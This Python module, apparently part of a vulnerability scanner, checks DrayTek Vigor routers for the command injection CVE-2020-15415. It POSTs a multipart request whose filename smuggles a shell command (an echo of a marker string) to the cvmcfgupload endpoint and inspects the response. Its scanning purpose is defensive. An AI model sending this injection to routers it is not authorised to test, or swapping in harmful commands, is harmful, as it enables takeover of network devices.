"""Agent Asteroid implementation for CVE-2020-15415"""

import logging
import re
from urllib import parse as urlparse

import requests

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "Remote Command Execution in DrayTek Vigor Routers"
VULNERABILITY_REFERENCE = "CVE-2020-15415"
VULNERABILITY_DESCRIPTION = """A command injection vulnerability exists in the cgi-bin/mainfunction.cgi/cvmcfgupload endpoint of DrayTek Vigor3900, Vigor2960, and Vigor300B devices before version 1.5.1, allowing remote code execution via shell metacharacters in a filename."""
RISK_RATING = "CRITICAL"

MAX_REDIRECTS = 2
DEFAULT_TIMEOUT = 90

UNIQUE_VALUE = "Ostorlab_scanner"


@exploits_registry.register
class DrayTekVigorCommandInjectionExploit(webexploit.WebExploit):
    accept_request = definitions.Request(method="GET", path="/")
    check_request = definitions.Request(
        method="POST", path="/cgi-bin/mainfunction.cgi/cvmcfgupload?1=2"
    )
    accept_pattern = [re.compile(r"Vigor Login Page")]
    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """Rule to detect the remote command execution vulnerability on a specific target.
        Args:
            target: Target to scan
        Returns:
            List of identified vulnerabilities.
        """
        session = requests.Session()
        session.max_redirects = MAX_REDIRECTS
        session.verify = False

        # Construct the target endpoint for the vulnerability check
        target_endpoint = urlparse.urljoin(target.origin, self.check_request.path)

        # Payload to exploit the vulnerability and echo "Ostorlab_scanner"
        payload = """------WebKitFormBoundary
Content-Disposition: form-data; name="abc"; filename="t';echo Ostorlab_scanner;echo 'oxo_"
Content-Type: text/x-python-script

------WebKitFormBoundary--"""

        try:
            # Send the POST request to the vulnerable endpoint
            resp = session.post(
                target_endpoint,
                data=payload,
                timeout=DEFAULT_TIMEOUT,
                headers={
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary"
                },
            )
        except requests.RequestException as e:
            logging.error("HTTP Request failed: %s", e)
            return []

        # Check if the response contains the echo string
        if UNIQUE_VALUE in resp.text:
            vulnerability = self._create_vulnerability(target)
            return [vulnerability]

        return []
